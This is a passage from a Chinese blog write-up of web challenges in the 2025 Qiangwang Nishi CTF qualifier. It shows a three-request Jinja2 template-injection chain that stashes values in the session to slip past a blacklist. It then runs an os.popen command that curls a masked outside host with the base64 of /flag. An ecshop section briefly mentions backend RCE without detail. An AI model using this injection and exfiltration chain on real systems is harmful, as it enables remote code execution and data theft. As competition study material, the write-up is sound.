+<p>通过将中间值存储再 session，实现黑名单绕过以及缩减长度，最终 payload 如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://web-13f5625fbc.challenge.xctf.org.cn/login?secret=1140457d-a0b5-4e6d-a423-5a676e61992a&amp;username=&#123;%<span class="hljs-built_in">set</span> a=sset(<span class="hljs-string">&#x27;g&#x27;</span>,request.args.v)%&#125;&amp;v=__globals__<br>http://web-13f5625fbc.challenge.xctf.org.cn/login?secret=1140457d-a0b5-4e6d-a423-5a676e61992a&amp;username=&#123;%<span class="hljs-built_in">set</span> a=sset(<span class="hljs-string">&#x27;p&#x27;</span>,request.args.v)%&#125;&amp;v=curl http://**.**.**.**:28888/?f=`<span class="hljs-built_in">cat</span> /flag | <span class="hljs-built_in">base64</span>`<br>http://web-13f5625fbc.challenge.xctf.org.cn/login?secret=1140457d-a0b5-4e6d-a423-5a676e61992a&amp;username=&#123;%<span class="hljs-built_in">set</span> a=lipsum[sget(<span class="hljs-string">&#x27;g&#x27;</span>)].os.popen(sget(<span class="hljs-string">&#x27;p&#x27;</span>))%&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761403712800-25dbe278-7823-4695-b6df-0f8f254b131e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761403739087-16eb7865-03e8-4474-8390-f8a8b2e37705.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="ecshop"><a href="#ecshop" class="headerlink" title="ecshop"></a>ecshop</h1><p>emmm，既然其他的大哥都不放详细的分析过程的话，虽然我没解出来，但是分析到最后一步的过程我也不放了，就这样吧。</p>
+<p>题目的环境应该是想让我们利用前台的漏洞，但是我没有审到前台的漏洞，虽然后台的页面不知道是故意过滤了还是什么其他原因，但是依旧可以通过数据包进行登录到后台去rce。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/" class="category-chain-item">攻防渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/" class="print-no-link">#强网拟态</a>
+      
+        <a href="/tags/2025/" class="print-no-link">#2025</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2025强网拟态初赛web方向部分wp</div>
+      <div>http://candyb0x.github.io/2025/10/29/2025强网拟态初赛web方向部分wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Candy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月29日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年12月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/11/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%90%84%E7%A7%8D%E5%93%88%E5%B8%8C%E5%80%BC%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E5%88%A9%E7%94%A8/" title="域渗透各种哈希值的作用与利用">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">域渗透各种哈希值的作用与利用</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/15/Windows%E7%B3%BB%E7%BB%9Fshellcode%E5%BC%80%E5%8F%91/" title="Windows系统shellcode开发">
+                        <span class="hidden-mobile">Windows系统shellcode开发</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
